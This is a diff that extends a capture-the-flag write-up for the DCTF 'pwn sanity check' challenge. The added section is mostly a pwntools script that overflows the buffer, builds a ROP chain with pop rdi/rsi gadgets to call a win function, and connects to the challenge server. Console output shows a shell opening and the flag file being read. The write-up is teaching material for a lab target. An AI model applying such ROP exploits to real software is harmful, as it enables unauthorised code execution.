@@ -142,3 +142,60 @@ $
 
 The flag is **dctf{Ju5t_m0v3_0n}**.
 
+
+For learning purposes, there is another approach where we don't just skip to the `system("/bin/sh")` call. This involves a Return Oriented Programming (ROP) technique. More information can be found [here](https://ctf101.org/binary-exploitation/return-oriented-programming/), but essentially we chain small snippets of assembly together to enable us to jump to any function we want. Sample code is below:
+
+```py
+root@osboxes:~/Downloads# cat pwn_sanity_chk2.py 
+from pwn import *
+
+binary = context.binary = ELF('./pwn_sanity_check')
+
+if args.REMOTE:
+    p = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)
+else:
+    p = process(binary.path)
+
+pop_rdi = next(binary.search(asm('pop rdi; ret')))
+pop_rsi_r15 = next(binary.search(asm('pop rsi; pop r15; ret')))
+
+payload  = b''
+payload += 0x48 * b'A'
+payload += p64(pop_rdi)
+payload += p64(0xdeadbeef)
+payload += p64(pop_rsi_r15)
+payload += p64(0x1337c0de)
+payload += p64(0)
+payload += p64(binary.sym.win)
+
+p.sendlineafter('joke\n',payload)
+p.interactive()
+```
+
+
+And output from running the script:
+
+```console
+root@osboxes:~/Downloads# python pwn_sanity_chk2.py REMOTE
+[*] '/root/Downloads/pwn_sanity_check'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io on port 7480: Done
+[*] Switching to interactive mode
+will this work?
+you made it to win land, no free handouts this time, try harder
+one down, one to go!
+2/2 bro good job
+$ ls
+flag.txt
+pwn_sanity_check
+startService.sh
+$ cat flag.txt
+dctf{Ju5t_m0v3_0n}
+[*] Got EOF while reading in interactive
+$  
+```
+
